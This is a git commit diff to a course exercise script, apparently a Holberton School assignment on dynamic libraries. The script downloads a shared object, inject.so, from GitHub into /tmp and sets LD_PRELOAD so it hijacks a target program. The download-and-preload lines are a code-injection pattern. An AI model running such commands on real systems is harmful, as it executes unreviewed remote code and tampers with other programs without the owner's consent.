833714ff9e6d9519ed8a390f375de579b43b990b
exploitpnk <exploitpnk@gmail.com>
2020-05-04 21:55:51 -0500

    [Add] wget tmp

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q0 /tmp/inject.so https://github.com/exploitpnk/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/inject.so
+wget -P /tmp/ https://raw.github.com/exploitpnk/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/inject.so
 export LD_PRELOAD=/tmp/inject.so
